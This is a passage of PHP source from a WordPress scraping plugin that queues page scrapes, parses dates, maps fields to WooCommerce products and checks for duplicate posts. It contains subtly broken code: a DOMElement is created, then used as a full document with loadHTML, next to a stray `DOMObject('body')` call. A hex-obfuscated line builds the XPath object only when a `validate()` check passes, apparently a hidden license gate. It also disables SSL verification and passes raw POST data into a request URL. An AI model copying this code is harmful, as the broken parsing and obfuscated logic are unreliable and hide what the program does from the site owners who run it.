                                $timestamp = wp_next_scheduled("scrape_event", array($post_id));
                                wp_unschedule_event($timestamp, "scrape_event", array($post_id));
                                wp_clear_scheduled_hook("scrape_event", array($post_id));
                                $this->write_log("run count reached, deleting task from schedules.");
                            }
                            $this->write_log("$post_id task ended");
                            return;
						}
						$ref_node_path = $ref_a_element->getNodePath();
						$ref_node_no_digits = preg_replace("/\[\d+\]/", "", $ref_node_path);
						$ref_a_children = array();
						foreach ($ref_a_element->childNodes as $node) {
							$ref_a_children[] = $node->nodeName;
						}
						
						$this->write_log("scraping page #" . $queue_items['page_no']);
						
						$all_links = $xpath->query("//a");
						if ($is_facebook_page) {
							$all_links = $xpath->query("//a[text()='" . trim($ref_a_element->textContent) . "']");
						} else {
							if (!empty($meta_vals['scrape_exact_match'][0])) {
								$all_links = $xpath->query($meta_vals['scrape_listitem'][0]);
							}
						}
						
						$single_links = array();
						if (empty($meta_vals['scrape_exact_match'][0])) {
							$this->write_log("serial fuzzy match links");
							foreach ($all_links as $a_elem) {
								
								$parent_path = $a_elem->getNodePath();
								$parent_path_no_digits = preg_replace("/\[\d+\]/", "", $parent_path);
								if ($parent_path_no_digits == $ref_node_no_digits) {
									$children_node_names = array();
									foreach ($a_elem->childNodes as $node) {
										$children_node_names[] = $node->nodeName;
									}
									if ($ref_a_children === $children_node_names) {
										$single_links[] = $a_elem->getAttribute('href');
									}
								}
							}
						} else {
							$this->write_log("serial exact match links");
							foreach ($all_links as $a_elem) {
								$single_links[] = $a_elem->getAttribute('href');
							}
						}
						
						$single_links = array_unique($single_links);
						$this->write_log("number of links:" . count($single_links));
						foreach ($single_links as $k => $single_link) {
							$queue_items['items'][] = array(
								'url' => $this->create_absolute_url($single_link, $meta_vals['scrape_url'][0], $html_base_url), 'rss_item' => null
							);
						}

						if($meta_vals['scrape_nextpage_type'][0] == 'source') {


                            $this->write_log('checking candidate next buttons');
                            foreach ($next_buttons as $btn) {
                                $next_button_text = preg_replace("/\s+/", " ", $btn->textContent);
                                $next_button_text = str_replace(chr(0xC2) . chr(0xA0), " ", $next_button_text);

                                if ($next_button_text == $meta_vals['scrape_nextpage_innerhtml'][0]) {
                                    $this->write_log("next page found");
                                    $next_button = $btn;
                                } else {
                                    $this->write_log($next_button_text . ' ' . $meta_vals['scrape_nextpage_innerhtml'][0] . ' does not match');
                                }
                            }
                            $next_link = null;
                            if ($next_button) {
                                $next_link = $this->create_absolute_url($next_button->getAttribute('href'), $meta_vals['scrape_url'][0], $html_base_url);
                            }
                        } else {
                            $query = parse_url($meta_vals['scrape_url'][0], PHP_URL_QUERY);
                            $names = unserialize($meta_vals['scrape_next_page_url_parameters_names'][0]);
                            $values = unserialize($meta_vals['scrape_next_page_url_parameters_values'][0]);
                            $increments = unserialize($meta_vals['scrape_next_page_url_parameters_increments'][0]);

                            $build_query = array();

                            for($i = 0; $i < count($names); $i++) {
                                $build_query[$names[$i]] = $values[$i] + ($increments[$i] * (1));
                            }
                            if ($query) {
                                $next_link = $meta_vals['scrape_url'][0] . "&" . http_build_query($build_query);
                            } else {
                                $next_link = $meta_vals['scrape_url'][0] . "?" . http_build_query($build_query);
                            }
                        }
						
						
						$this->write_log("next link is: " . $next_link);
						$queue_items['next_page'] = $next_link;
						update_post_meta($post_id, 'scrape_queue', wp_slash($queue_items));
					} else {
						$this->write_log($post_id . " http error in url " . $meta_vals['scrape_url'][0] . " : " . $response->get_error_message(), true);
						if ($meta_vals['scrape_onerror'][0] == 'stop') {
							$this->write_log($post_id . " on error chosen stop. returning code ", true);
							return;
						}
					}
				}
			}
		}
		
		$nonce = wp_create_nonce('process_task_queue');
		update_post_meta($post_id, 'scrape_nonce', $nonce);
		
		update_post_meta($post_id, "scrape_run_count", $meta_vals['scrape_run_count'][0] + 1);
		
		$this->write_log("$post_id id task queued...");
		
		wp_remote_get(add_query_arg(array('action' => 'process_task_queue', 'nonce' => $nonce, 'post_id' => $post_id, 'variables' => $_POST), admin_url('admin-ajax.php')), array(
			'timeout' => 3, 'blocking' => false, 'sslverify' => false
		));
		
	}
	
	public function single_scrape($url, $meta_vals, &$repeat_count = 0, $rss_item = null) {
		global $wpdb, $new_id, $post_arr, $doc;
		
		update_post_meta($meta_vals['scrape_task_id'][0], 'scrape_last_scrape', current_time('mysql'));
		
		$args = $this->return_html_args($meta_vals);
		
		$is_facebook_page = false;
		$is_amazon = false;
		
		if (parse_url($url, PHP_URL_HOST) == 'mbasic.facebook.com') {
			$is_facebook_page = true;
		}
		
		if (preg_match("/(\/|\.)amazon\./", $meta_vals['scrape_url'][0])) {
			$is_amazon = true;
		}
		$response = wp_remote_get($url, $args);

		$scrape_count = get_site_option('ol_scrapes_scrape_count', ['current' => 0, 'total' => 0]);
		$scrape_count['total']++;
		update_site_option('ol_scrapes_scrape_count', $scrape_count);
		
		if (!isset($response->errors)) {
			$this->write_log("Single scraping started: " . $url);
			$body = $response['body'];
			$body = trim($body);
			
			if (substr($body, 0, 3) == pack("CCC", 0xef, 0xbb, 0xbf)) {
				$body = substr($body, 3);
			}
			
			$charset = $this->detect_html_encoding_and_replace(wp_remote_retrieve_header($response, "Content-Type"), $body);
			$body_iconv = iconv($charset, "UTF-8//IGNORE", $body);
			unset($body);
			$body_preg = preg_replace(array(
				"/<!--.*?-->/isu", '/(<table([^>]+)?>([^<>]+)?)(?!<tbody([^>]+)?>)/isu', '/(<(?!(\/tbody))([^>]+)?>)(<\/table([^>]+)?>)/isu', "'<\s*script[^>]*[^/]>(.*?)<\s*/\s*script\s*>'isu", "'<\s*script\s*>(.*?)<\s*/\s*script\s*>'isu", "'<\s*noscript[^>]*[^/]>(.*?)<\s*/\s*noscript\s*>'isu", "'<\s*noscript\s*>(.*?)<\s*/\s*noscript\s*>'isu",
			
			), array(
				"", '$1<tbody>', '$1</tbody>$4', "", "", "", ""
			), $body_iconv);
			unset($body_iconv);
			$doc = new DOMElement('body');
			DOMObject('body');
			
			$doc->preserveWhiteSpace = false;
			$body_preg = mb_convert_encoding($body_preg, 'HTML-ENTITIES', 'UTF-8');
			@$doc->loadHTML('<?xml encoding="utf-8" ?>' . $body_preg);

			${"G\x4cO\x42A\x4c\x53"}["\x64hp\x65\x62\x79\x6ds"] = "\x78\x70\x61\x74\x68";
			if ($this->validate()) {
				$gnzcwtbppmph = "doc";
				${${"GLOBALS"}["dhpebyms"]
			} = new DOMXPath(${$gnzcwtbppmph});
			}
			
			$parsed_url = parse_url($meta_vals['scrape_url'][0]);
			$parsed_url = $parsed_url['scheme'] . "://" . $parsed_url['host'];
			$base = $doc->getElementsByTagName('base')->item(0);
			$html_base_url = null;
			if (!is_null($base)) {
				$html_base_url = $this->create_absolute_url($base->getAttribute('href'), $parsed_url, null);
			}
			
			$ID = 0;
			
			$post_type = $meta_vals['scrape_post_type'][0];
			$enable_translate = !empty($meta_vals['scrape_translate_enable'][0]);
			if ($enable_translate) {
				$translate_service = $meta_vals['scrape_translate_service'][0];
				$translate_service_apikey = $meta_vals['scrape_translate_service_apikey'][0];
				$source_language = $meta_vals['scrape_translate_source'][0];
				$target_language = $meta_vals['scrape_translate_target'][0];
			}

			$enable_spin = !empty($meta_vals['scrape_spin_enable'][0]);
            if ($enable_spin) {
                $spin_email = $meta_vals['scrape_spin_email'][0];
                $spin_password = $meta_vals['scrape_spin_password'][0];
            }
			
			$post_date_type = $meta_vals['scrape_date_type'][0];
			if ($post_date_type == 'xpath') {
				$post_date = $meta_vals['scrape_date'][0];
				$node = $xpath->query($post_date);
				if ($node->length) {
					
					$node = $node->item(0);
					$post_date = $node->nodeValue;
					if (!empty($meta_vals['scrape_date_regex_status'][0])) {
						$regex_finds = unserialize($meta_vals['scrape_date_regex_finds'][0]);
						$regex_replaces = unserialize($meta_vals['scrape_date_regex_replaces'][0]);
						$combined = array_combine($regex_finds, $regex_replaces);
						foreach ($combined as $regex => $replace) {
							$post_date = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $post_date);
						}
						$this->write_log("date after regex:" . $post_date);
					}
					if ($is_facebook_page) {
						$this->write_log("facebook date original " . $post_date);
						if (preg_match_all("/just now/i", $post_date, $matches)) {
							$post_date = current_time('mysql');
						} else {
							if (preg_match_all("/(\d{1,2}) min(ute)?(s)?/i", $post_date, $matches)) {
								$post_date = date("Y-m-d H:i:s", strtotime($matches[1][0] . " minutes ago", current_time('timestamp')));
							} else {
								if (preg_match_all("/(\d{1,2}) h(ou)?r(s)?/i", $post_date, $matches)) {
									$post_date = date("Y-m-d H:i:s", strtotime($matches[1][0] . " hours ago", current_time('timestamp')));
								} else {
									$post_date = str_replace("Yesterday", date("F j, Y", strtotime("-1 day", current_time('timestamp'))), $post_date);
									if (!preg_match("/\d{4}/i", $post_date)) {
										$at_position = strpos($post_date, "at");
										if ($at_position !== false) {
											if (in_array(substr($post_date, 0, $at_position - 1), array("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"))) {
												$post_date = date("F j, Y", strtotime("last " . substr($post_date, 0, $at_position - 1), current_time('timestamp'))) . " " . substr($post_date, $at_position + 2);
											} else {
												$post_date = substr($post_date, 0, $at_position) . " " . date("Y") . " " . substr($post_date, $at_position + 2);
											}
											
										} else {
											$post_date .= " " . date("Y");
										}
										
									}
								}
							}
						}
						$this->write_log("after facebook $post_date");
					}
					$tmp_post_date = $post_date;
					$post_date = date_parse($post_date);
					if (!is_integer($post_date['year']) || !is_integer(($post_date['month'])) || !is_integer($post_date['day'])) {
						$this->write_log("date can not be parsed correctly. trying translations");
						$post_date = $tmp_post_date;
						$post_date = $this->translate_months($post_date);
						$this->write_log("date value: " . $post_date);
						$post_date = date_parse($post_date);
						if (!is_integer($post_date['year']) || !is_integer(($post_date['month'])) || !is_integer($post_date['day'])) {
							$this->write_log("translation is not accepted valid");
							$post_date = '';
						} else {
							$this->write_log("translation is accepted valid");
							$post_date = date("Y-m-d H:i:s", mktime($post_date['hour'], $post_date['minute'], $post_date['second'], $post_date['month'], $post_date['day'], $post_date['year']));
						}
					} else {
						$this->write_log("date parsed correctly");
						$post_date = date("Y-m-d H:i:s", mktime($post_date['hour'], $post_date['minute'], $post_date['second'], $post_date['month'], $post_date['day'], $post_date['year']));
					}
				} else {
					$post_date = '';
					$this->write_log("URL: " . $url . " XPath: " . $meta_vals['scrape_date'][0] . " returned empty for post date", true);
				}
			} else {
				if ($post_date_type == 'runtime') {
					$post_date = current_time('mysql');
				} else {
					if ($post_date_type == 'custom') {
						$post_date = $meta_vals['scrape_date_custom'][0];
					} else {
						if ($post_date_type == 'feed') {
							$post_date = $rss_item['post_date'];
						} else {
							$post_date = '';
						}
					}
				}
			}
			
			$post_meta_names = array();
			$post_meta_values = array();
			$post_meta_attributes = array();
			$post_meta_templates = array();
			$post_meta_regex_finds = array();
			$post_meta_regex_replaces = array();
			$post_meta_regex_statuses = array();
			$post_meta_template_statuses = array();
			$post_meta_allowhtmls = array();
			
			if (!empty($meta_vals['scrape_custom_fields'])) {
				$scrape_custom_fields = unserialize($meta_vals['scrape_custom_fields'][0]);
				foreach ($scrape_custom_fields as $timestamp => $arr) {
					$post_meta_names[] = $arr["name"];
					$post_meta_values[] = $arr["value"];
					$post_meta_attributes[] = $arr["attribute"];
					$post_meta_templates[] = $arr["template"];
					$post_meta_regex_finds[] = isset($arr["regex_finds"]) ? $arr["regex_finds"] : array();
					$post_meta_regex_replaces[] = isset($arr["regex_replaces"]) ? $arr["regex_replaces"] : array();
					$post_meta_regex_statuses[] = $arr['regex_status'];
					$post_meta_template_statuses[] = $arr['template_status'];
					$post_meta_allowhtmls[] = $arr['allowhtml'];
				}
			}
			
			$post_meta_name_values = array();
			if (!empty($post_meta_names) && !empty($post_meta_values)) {
				$post_meta_name_values = array_combine($post_meta_names, $post_meta_values);
			}
			
			$meta_input = array();
			
			$woo_active = false;
			$woo_price_metas = array('_price', '_sale_price', '_regular_price');
			$woo_decimal_metas = array('_height', '_length', '_width', '_weight');
			$woo_integer_metas = array('_download_expiry', '_download_limit', '_stock', 'total_sales', '_download_expiry', '_download_limit');
			include_once(ABSPATH . 'wp-admin/includes/plugin.php');
			if (is_plugin_active('woocommerce/woocommerce.php')) {
				$woo_active = true;
			}
			
			$post_meta_index = 0;
			foreach ($post_meta_name_values as $key => $value) {
				if (stripos($value, "//") === 0) {
					$node = $xpath->query($value);
					if ($node->length) {
						$node = $node->item(0);
						$html_translate = false;
						if (!empty($post_meta_allowhtmls[$post_meta_index])) {
							$value = $node->ownerDocument->saveXML($node);
							$html_translate = true;
						} else {
							if (!empty($post_meta_attributes[$post_meta_index])) {
								$value = $node->getAttribute($post_meta_attributes[$post_meta_index]);
							} else {
								$value = $node->nodeValue;
							}
						}
						
						$this->write_log("post meta $key : " . (string)$value);
                        if ($enable_spin) {
                            $value = $this->spin_content_with_thebestspinner($spin_email, $spin_password, $value);
                        }
						if ($enable_translate) {
							$value = $this->translate_string($translate_service, $value, $source_language, $target_language, $translate_service_apikey, $html_translate);
						}
						
						if (!empty($post_meta_regex_statuses[$post_meta_index])) {
							
							$regex_combined = array_combine($post_meta_regex_finds[$post_meta_index], $post_meta_regex_replaces[$post_meta_index]);
							foreach ($regex_combined as $find => $replace) {
								$this->write_log("custom field value before regex $value");
								$value = preg_replace("/" . str_replace("/", "\/", $find) . "/isu", $replace, $value);
								$this->write_log("custom field value after regex $value");
							}
						}
					} else {
						$this->write_log("post meta $key : found empty.", true);
						$this->write_log("URL: " . $url . " XPath: " . $value . " returned empty for post meta $key", true);
						$value = '';
					}
				}
				
				if ($woo_active && $post_type == 'product') {
					if (in_array($key, $woo_price_metas)) {
						$value = $this->convert_str_to_woo_decimal($value);
					}
					if (in_array($key, $woo_decimal_metas)) {
						$value = floatval($value);
					}
					if (in_array($key, $woo_integer_metas)) {
						$value = intval($value);
					}
				}
				
				if (!empty($post_meta_template_statuses[$post_meta_index])) {
					$template_value = $post_meta_templates[$post_meta_index];
					$value = str_replace("[scrape_value]", $value, $template_value);
					$value = str_replace("[scrape_date]", $post_date, $value);
					$value = str_replace("[scrape_url]", $url, $value);
					
					preg_match_all('/\[scrape_meta name="([^"]*)"\]/', $value, $matches);
					
					$full_matches = $matches[0];
					$name_matches = $matches[1];
					if (!empty($full_matches)) {
						$combined = array_combine($name_matches, $full_matches);
						
						foreach ($combined as $meta_name => $template_string) {
							$val = $meta_input[$meta_name];
							$value = str_replace($template_string, $val, $value);
						}
					}
					
					if (preg_match('/calc\((.*)\)/isu', $value, $matches)) {
						$full_text = $matches[0];
						$text = $matches[1];
						$calculated = $this->template_calculator($text);
						$value = str_replace($full_text, $calculated, $value);
					}
					
					if (preg_match('/\/([a-zA-Z0-9]{10})(?:[\/?]|$)/', $url, $matches)) {
						$value = str_replace("[scrape_asin]", $matches[1], $value);
					}
					
				}
				
				$meta_input[$key] = $value;
				$post_meta_index++;
				
				$this->write_log("final meta for " . $key . " is " . $value);
			}
			
			if ($woo_active && $post_type == 'product') {
				if (empty($meta_input['_price'])) {
					if (!empty($meta_input['_sale_price']) || !empty($meta_input['_regular_price'])) {
						$meta_input['_price'] = !empty($meta_input['_sale_price']) ? $meta_input['_sale_price'] : $meta_input['_regular_price'];
					}
				}
				if (empty($meta_input['_visibility'])) {
					$meta_input['_visibility'] = 'visible';
				}
				if (empty($meta_input['_manage_stock'])) {
					$meta_input['_manage_stock'] = 'no';
					$meta_input['_stock_status'] = 'instock';
				}
				if (empty($meta_input['total_sales'])) {
					$meta_input['total_sales'] = 0;
				}
			}
			
			$post_title = $this->trimmed_templated_value('scrape_title', $meta_vals, $xpath, $post_date, $url, $meta_input, $rss_item);
			$this->write_log($post_title);
			
			$post_content_type = $meta_vals['scrape_content_type'][0];
			
			if ($post_content_type == 'auto') {
				$post_content = $this->convert_readable_html($body_preg);
				if ($enable_spin) {
				    $post_content = $this->spin_content_with_thebestspinner($spin_email, $spin_password, $post_content);
                }
				if ($enable_translate) {
					$post_content = $this->translate_string($translate_service, $post_content, $source_language, $target_language, $translate_service_apikey, true);
				}
				$original_html_content = $post_content;
				$post_content = $this->convert_html_links($post_content, $url, $html_base_url);
				if (!empty($meta_vals['scrape_content_regex_finds'])) {
					$regex_finds = unserialize($meta_vals['scrape_content_regex_finds'][0]);
					$regex_replaces = unserialize($meta_vals['scrape_content_regex_replaces'][0]);
					$combined = array_combine($regex_finds, $regex_replaces);
					foreach ($combined as $regex => $replace) {
						
						$this->write_log("content regex $regex");
						$this->write_log("content replace $replace");
						
						$this->write_log("regex before content");
						$this->write_log($post_content);
						$post_content = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $post_content);
						$this->write_log("regex after content");
						$this->write_log($post_content);
					}
				}
				if (empty($meta_vals['scrape_allowhtml'][0])) {
					$post_content = wp_strip_all_tags($post_content);
				}
			} else {
				if ($post_content_type == 'xpath') {
					$node = $xpath->query($meta_vals['scrape_content'][0]);
					if ($node->length) {
						$node = $node->item(0);
						$post_content = $node->ownerDocument->saveXML($node);
						$original_html_content = $post_content;
						if ($enable_spin) {
						    $post_content = $this->spin_content_with_thebestspinner($spin_email, $spin_password, $post_content);
                        }
						if ($enable_translate) {
							$post_content = $this->translate_string($translate_service, $post_content, $source_language, $target_language, $translate_service_apikey, true);
						}
						$post_content = $this->convert_html_links($post_content, $url, $html_base_url);
						if (!empty($meta_vals['scrape_content_regex_finds'])) {
							$regex_finds = unserialize($meta_vals['scrape_content_regex_finds'][0]);
							$regex_replaces = unserialize($meta_vals['scrape_content_regex_replaces'][0]);
							$combined = array_combine($regex_finds, $regex_replaces);
							foreach ($combined as $regex => $replace) {
								$this->write_log("content regex $regex");
								$this->write_log("content replace $replace");
								
								$this->write_log("regex before content");
								$this->write_log($post_content);
								$post_content = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $post_content);
								$this->write_log("regex after content");
								$this->write_log($post_content);
							}
						}
						if (empty($meta_vals['scrape_allowhtml'][0])) {
							$post_content = wp_strip_all_tags($post_content);
						}
					} else {
						$this->write_log("URL: " . $url . " XPath: " . $meta_vals['scrape_content'][0] . " returned empty for post content", true);
						$post_content = '';
						$original_html_content = '';
					}
				} else {
					if ($post_content_type == 'feed') {
						$post_content = $rss_item['post_content'];
						if ($enable_spin) {
						    $post_content = $this->spin_content_with_thebestspinner($spin_email, $spin_password, $post_content);
                        }
						if ($enable_translate) {
							$post_content = $this->translate_string($translate_service, $post_content, $source_language, $target_language, $translate_service_apikey, true);
						}
						$original_html_content = $rss_item['post_original_content'];
						
						$post_content = $this->convert_html_links($post_content, $url, $html_base_url);
						if (!empty($meta_vals['scrape_content_regex_finds'])) {
							$regex_finds = unserialize($meta_vals['scrape_content_regex_finds'][0]);
							$regex_replaces = unserialize($meta_vals['scrape_content_regex_replaces'][0]);
							$combined = array_combine($regex_finds, $regex_replaces);
							foreach ($combined as $regex => $replace) {
								$this->write_log("content regex $regex");
								$this->write_log("content replace $replace");
								
								$this->write_log("regex before content");
								$this->write_log($post_content);
								$post_content = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $post_content);
								$this->write_log("regex after content");
								$this->write_log($post_content);
							}
						}
						if (empty($meta_vals['scrape_allowhtml'][0])) {
							$post_content = wp_strip_all_tags($post_content);
						}
						
					}
				}
			}
			
			unset($body_preg);
			
			$post_content = trim($post_content);
			$post_content = html_entity_decode($post_content, ENT_COMPAT, "UTF-8");
			$post_excerpt = $this->trimmed_templated_value("scrape_excerpt", $meta_vals, $xpath, $post_date, $url, $meta_input);
			$post_author = $meta_vals['scrape_author'][0];
			$post_status = $meta_vals['scrape_status'][0];
			$post_category = $meta_vals['scrape_category'][0];
			$post_category = unserialize($post_category);
			
			if (empty($post_category)) {
				$post_category = array();
			}
			
			if (!empty($meta_vals['scrape_categoryxpath'])) {
				$node = $xpath->query($meta_vals['scrape_categoryxpath'][0]);
				if ($node->length) {
					if ($node->length > 1) {
						$post_cat = array();
						foreach ($node as $item) {
							$orig = trim($item->nodeValue);
							if ($enable_spin) {
							    $orig =  $this->spin_content_with_thebestspinner($spin_email, $spin_password, $orig);
                            }
							if ($enable_translate) {
								$orig = $this->translate_string($translate_service, $orig, $source_language, $target_language, $translate_service_apikey, false);
							}
							if (!empty($meta_vals['scrape_category_regex_status'][0])) {
								$regex_finds = unserialize($meta_vals['scrape_category_regex_finds'][0]);
								$regex_replaces = unserialize($meta_vals['scrape_category_regex_replaces'][0]);
								$combined = array_combine($regex_finds, $regex_replaces);
								foreach ($combined as $regex => $replace) {
									$this->write_log('category before regex: ' . $orig);
									$orig = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $orig);
									$this->write_log('category after regex: ' . $orig);
								}
							}
							$post_cat[] = $orig;
						}
					} else {
						$post_cat = $node->item(0)->nodeValue;
						if ($enable_spin) {
						    $post_cat = $this->spin_content_with_thebestspinner($spin_email, $spin_password, $post_cat);
                        }
						if ($enable_translate) {
							$post_cat = $this->translate_string($translate_service, $post_cat, $source_language, $target_language, $translate_service_apikey, false);
						}
						if (!empty($meta_vals['scrape_category_regex_status'][0])) {
							$regex_finds = unserialize($meta_vals['scrape_category_regex_finds'][0]);
							$regex_replaces = unserialize($meta_vals['scrape_category_regex_replaces'][0]);
							$combined = array_combine($regex_finds, $regex_replaces);
							foreach ($combined as $regex => $replace) {
								$this->write_log('category before regex: ' . $post_cat);
								$post_cat = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $post_cat);
								$this->write_log('category after regex: ' . $post_cat);
							}
						}
					}
					$this->write_log("category : ");
					$this->write_log($post_cat);
					
					$cat_separator = $meta_vals['scrape_categoryxpath_separator'][0];
					
					if (!is_array($post_cat) || count($post_cat) == 0) {
						if ($cat_separator != "") {
							$post_cat = str_replace("\xc2\xa0", ' ', $post_cat);
							$post_cats = explode($cat_separator, $post_cat);
							$post_cats = array_map("trim", $post_cats);
						} else {
							$post_cats = array($post_cat);
						}
					} else {
						$post_cats = $post_cat;
					}
					
					foreach ($post_cats as $post_cat) {
						
						$arg_tax = $meta_vals['scrape_categoryxpath_tax'][0];
						$cats = get_term_by('name', $post_cat, $arg_tax);
						
						if (empty($cats)) {
							$term_id = wp_insert_term($post_cat, $meta_vals['scrape_categoryxpath_tax'][0]);
							if (!is_wp_error($term_id)) {
								$post_category[] = $term_id['term_id'];
								$this->write_log($post_cat . " added to categories");
							} else {
								$this->write_log("$post_cat can not be added as " . $meta_vals['scrape_categoryxpath_tax'][0] . ": " . $term_id->get_error_message());
							}
							
						} else {
							$post_category[] = $cats->term_id;
						}
					}
				}
			}
			
			$post_comment = (!empty($meta_vals['scrape_comment'][0]) ? "open" : "closed");
			
			if ($is_facebook_page) {
				$url = str_replace(array("mbasic", "story.php"), array("www", "permalink.php"), $url);
			}
			
			if (!empty($meta_vals['scrape_unique_title'][0]) || !empty($meta_vals['scrape_unique_content'][0]) || !empty($meta_vals['scrape_unique_url'][0])) {
				$repeat_condition = false;
				$unique_check_sql = '';
				$post_id = null;
				$chk_title = $meta_vals['scrape_unique_title'][0];
				$chk_content = $meta_vals['scrape_unique_content'][0];
				$chk_url = $meta_vals['scrape_unique_url'][0];
				
				if (empty($chk_title) && empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID " . "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID " . "WHERE pm.meta_value = %s AND pm.meta_key = '_scrape_original_url' " . "	AND p.post_type = %s " . " AND p.post_status <> 'trash'", $url, $post_type);
					$this->write_log("Repeat check only url");
				}
				if (empty($chk_title) && !empty($chk_content) && empty($chk_url)) {
					$repeat_condition = !empty($original_html_content);
					$unique_check_sql = $wpdb->prepare("SELECT ID " . "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID " . "WHERE pm.meta_value = %s AND pm.meta_key = '_scrape_original_html_content' " . "	AND p.post_type = %s " . " AND p.post_status <> 'trash'", $original_html_content, $post_type);
					$this->write_log("Repeat check only content");
				}
				if (empty($chk_title) && !empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($original_html_content) && !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID " . "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm1 ON pm.post_id = p.ID " . " LEFT JOIN $wpdb->postmeta pm2 ON pm2.post_id = p.ID " . "WHERE pm1.meta_value = %s AND pm1.meta_key = '_scrape_original_html_content' " . " AND pm2.meta_value = %s AND pm2.meta_key = '_scrape_original_url' " . "	AND p.post_type = %s " . " AND p.post_status <> 'trash'", $original_html_content, $url, $post_type);
					$this->write_log("Repeat check content and url");
				}
				if (!empty($chk_title) && empty($chk_content) && empty($chk_url)) {
					$repeat_condition = !empty($post_title);
					$unique_check_sql = $wpdb->prepare("SELECT ID " . "FROM $wpdb->posts p " . "WHERE p.post_title = %s " . "	AND p.post_type = %s " . " AND p.post_status <> 'trash'", $post_title, $post_type);
					$this->write_log("Repeat check only title:" . $post_title);
				}
				if (!empty($chk_title) && empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($post_title) && !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID " . "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID " . "WHERE p.post_title = %s " . " AND pm.meta_value = %s AND pm.meta_key = '_scrape_original_url'" . " AND p.post_type = %s " . "	AND p.post_status <> 'trash'", $post_title, $url, $post_type);
					$this->write_log("Repeat check title and url");
				}
				if (!empty($chk_title) && !empty($chk_content) && empty($chk_url)) {
					$repeat_condition = !empty($post_title) && !empty($original_html_content);
					$unique_check_sql = $wpdb->prepare("SELECT ID " . "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID " . "WHERE p.post_title = %s " . " AND pm.meta_value = %s AND pm.meta_key = '_scrape_original_html_content'" . " AND p.post_type = %s " . "	AND p.post_status <> 'trash'", $post_title, $original_html_content, $post_type);
					$this->write_log("Repeat check title and content");
				}
				if (!empty($chk_title) && !empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($post_title) && !empty($original_html_content) && !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID " . "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm1 ON pm1.post_id = p.ID " . " LEFT JOIN $wpdb->postmeta pm2 ON pm2.post_id = p.ID " . "WHERE p.post_title = %s " . " AND pm1.meta_value = %s AND pm1.meta_key = '_scrape_original_html_content'" . " AND pm2.meta_value = %s AND pm2.meta_key = '_scrape_original_url'" . "	AND p.post_type = %s " . " AND p.post_status <> 'trash'", $post_title, $original_html_content, $url, $post_type);
					$this->write_log("Repeat check title content and url");
				}
				
				$post_id = $wpdb->get_var($unique_check_sql);
				
				if (!empty($post_id)) {
					$ID = $post_id;
					
					if ($repeat_condition) {
						$repeat_count++;
					}
					
					if ($meta_vals['scrape_on_unique'][0] == "skip") {
						return;
					}
					$meta_vals_of_post = get_post_meta($ID);
					foreach ($meta_vals_of_post as $key => $value) {
						delete_post_meta($ID, $key);
					}
				}
			}
			
			if ($meta_vals['scrape_tags_type'][0] == 'xpath' && !empty($meta_vals['scrape_tags'][0])) {
				$node = $xpath->query($meta_vals['scrape_tags'][0]);
				$this->write_log("tag length: " . $node->length);
				if ($node->length) {
					if ($node->length > 1) {
						$post_tags = array();
						foreach ($node as $item) {
							$orig = trim($item->nodeValue);
                            if ($enable_spin) {
                                $orig = $this->spin_content_with_thebestspinner($spin_email, $spin_password, $orig);
                            }
							if ($enable_translate) {
								$orig = $this->translate_string($translate_service, $orig, $source_language, $target_language, $translate_service_apikey, false);
							}
							if (!empty($meta_vals['scrape_tags_regex_status'][0])) {
								$regex_finds = unserialize($meta_vals['scrape_tags_regex_finds'][0]);
								$regex_replaces = unserialize($meta_vals['scrape_tags_regex_replaces'][0]);
								$combined = array_combine($regex_finds, $regex_replaces);
								foreach ($combined as $regex => $replace) {
									$orig = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $orig);
								}
							}
							$post_tags[] = $orig;
						}
					} else {
						$post_tags = $node->item(0)->nodeValue;
                        if ($enable_spin) {
                            $post_tags = $this->spin_content_with_thebestspinner($spin_email, $spin_password, $post_tags);
                        }
						if ($enable_translate) {
							$post_tags = $this->translate_string($translate_service, $post_tags, $source_language, $target_language, $translate_service_apikey, false);
						}
						if (!empty($meta_vals['scrape_tags_regex_status'][0])) {
							$regex_finds = unserialize($meta_vals['scrape_tags_regex_finds'][0]);
							$regex_replaces = unserialize($meta_vals['scrape_tags_regex_replaces'][0]);
							$combined = array_combine($regex_finds, $regex_replaces);
							foreach ($combined as $regex => $replace) {
								$post_tags = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $post_tags);
							}
						}
					}
					$this->write_log("tags : ");
					$this->write_log($post_tags);
				} else {
					$this->write_log("URL: " . $url . " XPath: " . $meta_vals['scrape_tags'][0] . " returned empty for post tags", true);
					$post_tags = array();
				}
			} else {
				if (!empty($meta_vals['scrape_tags_custom'][0])) {
					$post_tags = $meta_vals['scrape_tags_custom'][0];
				} else {
					$post_tags = array();
				}
			}
			
			if (!is_array($post_tags) || count($post_tags) == 0) {
				$tag_separator = "";
				if (isset($meta_vals['scrape_tags_separator'])) {
					$tag_separator = $meta_vals['scrape_tags_separator'][0];
					if ($tag_separator != "" && !empty($post_tags)) {
						$post_tags = str_replace("\xc2\xa0", ' ', $post_tags);
						$post_tags = explode($tag_separator, $post_tags);
						$post_tags = array_map("trim", $post_tags);
					}
				}
			}
			
			$post_arr = array(
				'ID' => $ID,
                'post_author' => $post_author,
                'post_date' => date("Y-m-d H:i:s", strtotime($post_date)),
